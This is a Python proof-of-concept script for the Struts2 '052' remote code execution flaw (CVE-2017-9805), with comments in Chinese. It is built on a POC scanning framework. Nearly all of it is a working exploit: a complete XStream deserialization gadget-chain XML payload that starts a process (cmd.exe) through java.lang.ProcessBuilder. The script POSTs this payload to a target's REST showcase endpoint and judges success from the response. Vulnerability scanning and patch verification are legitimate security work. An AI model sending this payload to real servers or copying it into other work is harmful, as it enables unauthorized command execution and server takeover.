#!/usr/bin/env python
# -*- coding:utf-8 -*-

'''
    name: Struts2 052远程代码执行
    CVE: CVE-2017-9805
    info: 当启用 Struts REST的XStream handler去反序列化处理XML请求，可能造成远程代码执行漏洞，进而直接导致服务器被入侵控制。
    level: 紧急
    type: 代码执行
    影响版本: Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12
    repair: Upgrade to Struts 2.5.13 or Struts 2.3.34
'''

import urllib, httplib
from POC_Framework import POC

class myPOC(POC):
    
    #单IP的POC
    def check(self, ip, port, timeout=5):
        try:
            data =('<map><entry><jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>C:/Windows/System32/cmd.exe</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/></entry></map>')
            headers = {'Content-type': 'application/xml'}
            httpClient = httplib.HTTPConnection('{0}:{1}'.format(ip,port), timeout=timeout)
            httpClient.request('POST', '/struts2-rest-showcase/orders/3', data, headers)
            response = httpClient.getresponse()
            body= response.read()
            httpClient.close()
            if "java.util.HashMap" in body:
                return True
            else:
                return False
        except:
            return False
                
if __name__ == '__main__':
    
    Check_POC = myPOC()
    Check_POC.run()